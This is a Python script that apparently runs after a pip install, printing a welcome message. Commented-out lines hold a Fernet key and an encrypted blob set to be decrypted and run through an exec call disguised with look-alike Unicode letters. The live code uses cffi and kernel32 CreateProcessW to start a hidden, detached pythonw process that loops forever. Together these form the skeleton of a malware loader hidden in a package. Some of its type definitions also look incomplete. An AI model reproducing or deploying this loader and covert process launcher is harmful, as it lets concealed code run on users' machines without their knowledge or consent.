from cryptography.fernet import Fernet


def main():
    # print("pip install over!!! welcome!!!good bye!!!")
    # k = b'PTaXDGeolRu907oTnv8zLDsaTqwQKcpG4NGUfBdCUg4='
    # my_str = b'gAAAAABoQ9_bYiNftMq-WYgBsSsZ2FIJHh_yMSXOPAzPBaIP2kCyWkVPtukBIvbbUV2EuMZ4sx9ytr7cddqk_AkjDH6Cgs_zsp_wOsvYWm2HEqn4mWJTXcsDxBCFH4sC_LBvZoXr8_uJooHU5m8ujAzqCGuNYoalQPyPm3_ZcsfCOlYNXKucMWlMNw3cGto8aebtR3PsbOp2sVBwAIsMIGKlJxBzQGaMf8ANsMtY9T4uyO7PdkyvB7bp_Ja39sI0NpTCgCLS2G0PiqATAzqqwunxlsyco3BVLWTSxhm3yas0kGq_ELSitc1FSUNxGZfjvQrN7WmEZa50__JTzNbaSZfWKa0gCFvCgqN8c6f_YMxMdCKaDN6tsDvObKIbRrCUPmHhRQb71yoMSHL4-PXn5u_YLm6Mm0x-GU7VdBQ8HVPrVQoOLOU6qHMSmtTghJ2Fa_BQ7PU7plcv74InhwmNpOKR7WPgEWlJVwpxjwsNxtY5OwiVHKkT5_gTFAFtVTfZNXvq1DAGfr7bJ_zMX4P7kFnfGDP4gzBKNkHi4IPfPEIzhdlVvbPetHXRJUO8WZYUyw_Dhgud6jot06XueMb2iB2LcEKMXh6-2e4lR7fMS_1YH__RrQj4tngoI7YHuChVzskWWuUGpvc4tqF9DkQhSBiFlkr7nRymFGtHfrIjZPm9-ncpeTv28yyTeWlNkHdg45I9mbD2xC9o8WP7S-bkZ4HOTNvBpYTKvujItLW2vqnbeDjla7hNg0ZWywdKz2kkj-UNuq1BbMpGyN8I1qEyUvkeLb_CuM2pomqhjjC8JNTYICQGgBbZqk5-B9J8-GZYq28fdbyL_ycp3hvZAoYMlquDBgQ-Nm62UEpOYhS5Wv0ZX_oK5c_RhVQKK0u4iYbxMDIka3S_7XjFW3jiiCfftmaZhCqEXzjgywRfQ2eWFn4ZsAiSpVK9EhQvZlhxTJgYZhFyiKH1PWfA4KsY6nZG_20pqGnnD7WXSlnkFOODRyuNLadH4vUkmrh2JES1Dy8hfkt24HpV_8QKAOKZ62pdws81FMTyEdoND-3ob_gpMKOMR-PCGBbOh2W260Z8cGQnp8y_f84nFjn_0BtbJkKiwGRPH8vk7vY1eehYmjMoK_IHxtz34s2uM09mSvi5MpZRBtH33_KZkdxCWpTX3Z7WnnNQ16tK5MSIDwUXJs8x1OHs94_8J5GFUAxVY6Eqd5pT_d51vZbQKBcBwo87axpwOIRNPj8UpWXDkGxqQXIEuVidRMbTv1qz5BO4w3JT6p2sszavgQmJIId75-GvB-zKbpIKMZsLnTb1-i-w-EiaHsRDUDOxGO7MUq6dwI1f_zYpPPphtgyiksdENYdI1OMqEf9kb25tJQU7sYBh16xede59oVBx3IyqJwqH7S-t6uhYGiroEN6Uo0Wi1sdhsUdfKprtMDi54y2W-2T8fg48ABoIvOyRl-MrLVllgFdzee5AhVYz9iLMVUs-7XC-eXVJP8wvaBsN9O7g3Yn6f2sPnJWKJaLSNULfzhNYmR1f4ijHHAnS5OsshFq5kNkxmdNbxpIWDG2RoV-ntM2DW1eXAZHRJWWAHgyglqNkeA7udBh1Fg_-Q6oOmP9O0BTTpjOa5K4MmNnMUlDcRZRWsokpGKyonNdMFEN_QeGu-e2Yxq4xO2iWoPH_AY6RSCYt288gpf8cH8qjkeTOJzs4ikpsZq5wAsI4NpN_vR3GAW097G4mRzryNtSIzL9PtdWmVs0i0b5zyaG28beiN7oYjNCb5OBtGmsmxNezLwhYofU0KeDuy34rDuH-ejaMtKkBRZ0WCCl13veNJzS2c2J7O_TBGDKKr-V6wXLXr4tYxeU8iyTzewvyn9OI61LKJgUfxeu-k_5x57S6rUNiUoT5Hx7DxRt-58UfJdLYgUA_doyxc1N2ONm0OM2RPvN82kFjWIzipg42qVnmQNE0DxRfQOtCu5fvA9T4ErB_CPwfgaqSU-w1VMag8mUSekZFVm7ersNpQ-YfXERHpHUO8_1pcpIQs9MlVpjETchRydMGAM8-W7l5pAK9_5KoM0FA86fUsdJesQrsxVdXzS0ZtzPJWEIWTJomlEawexxWTKse1dZ254TCNL3bdHVuz8TqV5pM9eXEO8x0GN4qhq5GaPJO4sn_PH29GzeFe0l8Nzz84pXwBKxv5aNxpfj6Y4s-USCoQwAr6FUvu4R66gf6gOlPIOwCHL10GA3geRM6MdK7okqZEcuD54sSynWbigO3hZIpDnT29GWRiQoSufEkd91b0O7F_7nd6ahYkjLP-_kvTIOvS1CU5tw05uVSSbc52WvSIc8MLhcr551uISo_0yhJzMf6Pg7XIOhhclNGkf3O0FphI15kFtf-kZ09rdB_YBFIZ6ZTXiINzNgD8AkveUtGfeOvUoVkSWqMb_Ly102deaWtDFaJ_a4mQ7EZJ7LHMi92U5P29F2jSVXNEqbZ789iG4rgDqOESj0z8iA0ll1xW1CJdzHZjlruwFtVCVI0i1ktUXs2ILIv6F3LG5tqWwtsagI88EsoQuikZ2hvhKuT1W1o5sQTL1WAM60cR6qeVMJ7lsryy1Aar-gDdCrn7npAkM65QPLBDNCj_32hJdsjTG4O5N-kVwVxGWmV2mlPa5tFUxnZsqdXnzA8ZgNErqL6ivM6n_Ue3HDwfaNeOy1XFb6Xgze9NdPQLHLh7VEg-MXMXOameKCEsGJJ7CgHXgcMY9gkudYxe7eS2lxL0UmIBSioUD0SNDJIIq1sh8cNCRad6mqn8X6AsbiBYxhA-Q=='
    # plaintext = Fernet(k).decrypt(my_str)
    # ℯ𝓍ℯ𝒸(plaintext)
    from cffi import FFI
    ffi = FFI()

    ffi.cdef("""
        typedef unsigned long DWORD;
        typedef int BOOL;
        typedef void* LPVOID;
        typedef wchar_t WCHAR;
        typedef WCHAR* LPWSTR;
        typedef const WCHAR* LPCWSTR;
        
        typedef struct _SECURITY_ATTRIBUTES {
            DWORD nLength;
            LPVOID lpSecurityDescriptor;
            BOOL bInheritHandle;
        } SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;
        
        typedef struct _STARTUPINFOW {
            DWORD cb;
            LPWSTR lpReserved;
            LPWSTR lpDesktop;
            LPWSTR lpTitle;
            DWORD dwX;
            DWORD dwY;
            DWORD dwXSize;
            DWORD dwYSize;
            DWORD dwXCountChars;
            DWORD dwYCountChars;
            DWORD dwFillAttribute;
            DWORD dwFlags;
            WORD wShowWindow;
            WORD cbReserved2;
            LPBYTE lpReserved2;
            HANDLE hStdInput;
            HANDLE hStdOutput;
            HANDLE hStdError;
        } STARTUPINFOW, *LPSTARTUPINFOW;
        
        typedef struct _PROCESS_INFORMATION {
            HANDLE hProcess;
            HANDLE hThread;
            DWORD dwProcessId;
            DWORD dwThreadId;
        } PROCESS_INFORMATION, *LPPROCESS_INFORMATION;
        
        BOOL CreateProcessW(
            LPCWSTR lpApplicationName,
            LPWSTR lpCommandLine,
            LPSECURITY_ATTRIBUTES lpProcessAttributes,
            LPSECURITY_ATTRIBUTES lpThreadAttributes,
            BOOL bInheritHandles,
            DWORD dwCreationFlags,
            LPVOID lpEnvironment,
            LPCWSTR lpCurrentDirectory,
            LPSTARTUPINFOW lpStartupInfo,
            LPPROCESS_INFORMATION lpProcessInformation
        );
    """)

    kernel32 = ffi.dlopen("kernel32.dll")

    startup_info = ffi.new("STARTUPINFOW*")
    startup_info.cb = ffi.sizeof("STARTUPINFOW")
    process_info = ffi.new("PROCESS_INFORMATION*")

    application_path = r"C:\Users\intC\AppData\Local\Programs\Python\Python313\pythonw.exe"

    CREATE_NO_WINDOW = 0x08000000
    DETACHED_PROCESS = 0x00000008
    flags = CREATE_NO_WINDOW | DETACHED_PROCESS

    app_path_wide = ffi.new("wchar_t[]", application_path)
    a = r'import time; exec(\"while True: time.sleep(5)\")'
    s = f'C:\\Users\\intC\\AppData\\Local\\Programs\\Python\\Python313\\pythonw.exe -c "{a}"'
    command_line = s
        
    if command_line:
        if isinstance(command_line, (list, tuple)):
            command_line = " ".join(command_line)
            
        cmd_line_wide = ffi.new("wchar_t[]", command_line)

    else:
        cmd_line_wide = ffi.NULL
    print(command_line)

    success = kernel32.CreateProcessW(
        app_path_wide,          # 应用程序名称
        cmd_line_wide,          # 命令行参数
        ffi.NULL,               # 进程安全属性
        ffi.NULL,               # 线程安全属性
        False,                  # 不继承句柄
        flags,                  # 创建标志
        ffi.NULL,               # 环境块
        ffi.NULL,               # 当前目录
        startup_info,           # STARTUPINFO
        process_info            # PROCESS_INFORMATION
    )

if __name__ == "__main__":
    main()
